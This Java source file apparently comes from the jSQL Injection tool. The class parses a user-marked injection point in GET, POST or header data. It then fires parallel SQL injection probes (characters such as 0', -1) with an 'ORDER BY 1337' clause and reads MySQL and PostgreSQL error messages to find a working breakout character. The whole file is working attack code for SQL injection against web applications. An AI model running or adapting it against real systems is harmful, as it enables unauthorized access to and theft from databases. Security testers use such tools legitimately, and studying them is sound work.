package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.util.ConnectionUtil;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    @Override
    public String run(Object... args) throws JSqlException {
        
        int nbStarInParameter = 0;
        
        if (ConnectionUtil.getDataQuery().contains("*")) {
            nbStarInParameter++;
        }
        if (ConnectionUtil.getDataRequest().contains("*")) {
            nbStarInParameter++;
        }
        if (ConnectionUtil.getDataHeader().contains("*")) {
            nbStarInParameter++;
        }
        
        // Injection Point
        if (nbStarInParameter >= 2) {
            throw new InjectionFailureException("Character * must be used once in GET, POST or Header parameters");
            
        } else if (
            ConnectionUtil.getDataQuery().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.QUERY
        ) {
            throw new InjectionFailureException("Activate method GET to use character * or remove it from GET parameters");
            
        } else if (
            ConnectionUtil.getDataRequest().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.REQUEST
        ) {
            throw new InjectionFailureException("Activate method POST to use character * or remove it from POST parameters");
            
        } else if (
            ConnectionUtil.getDataHeader().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.HEADER
        ) {
            throw new InjectionFailureException("Activate method Header to use character * or remove it from Header parameters");
            
        } 
        
        // Query String
        else if (
            ConnectionUtil.getMethodInjection() == MethodInjection.QUERY 
            && (ConnectionUtil.getDataQuery() == null || "".equals(ConnectionUtil.getDataQuery()))
        ) {
            throw new InjectionFailureException("No query string");
            
        } else if (
            !"".equals(ConnectionUtil.getDataQuery()) 
            && ConnectionUtil.getDataQuery().matches("[^\\w]*=.*")
        ) {
            throw new InjectionFailureException("Incorrect query string");
            
        } 
        
        // Request/Header data
        else if (
            !"".equals(ConnectionUtil.getDataRequest()) 
            && ConnectionUtil.getDataRequest().indexOf('=') < 0
        ) {
            throw new InjectionFailureException("Incorrect POST format");
            
        } else if (
            !"".equals(ConnectionUtil.getDataHeader()) 
            && ConnectionUtil.getDataHeader().indexOf(':') < 0
        ) {
            throw new InjectionFailureException("Incorrect HEADER format");
            
        // Parse query information: url=>everything before the sign '=',
        // start of query string=>everything after '='
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.QUERY) {
            if (ConnectionUtil.getDataQuery().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getDataQuery().matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getDataQuery());
                regexSearch.find();
                try {
                    ConnectionUtil.setDataQuery(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect GET format", e);
                }
            }
            
        // Parse post information
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.REQUEST) {
            if (ConnectionUtil.getDataRequest().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getDataRequest().matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getDataRequest());
                regexSearch.find();
                try {
                    ConnectionUtil.setDataRequest(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect POST format", e);
                }
            }
        // Parse header information
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.HEADER) {
            if (ConnectionUtil.getDataHeader().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getDataHeader().matches(".*:$")) {
                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(ConnectionUtil.getDataHeader());
                regexSearch.find();
                try {
                    ConnectionUtil.setDataHeader(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect Header format", e);
                }
            }
        }

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)", "-1))"}) {
            taskCompletionService.submit(
                new CallablePageSource(
                    insertionCharacter + 
                    MediatorModel.model().vendor.instance().sqlOrderBy(),
                    insertionCharacter
                )
            );
        }

        int total = 7;
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    // the correct character: mysql
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches() ||

                    // the correct character: postgresql
                    Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    return currentCallable.getInsertionCharacter();
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while determining character injection", e);
            }
            
        }

        // Nothing seems to work, forces 1 has the character
        return "1";
    }
}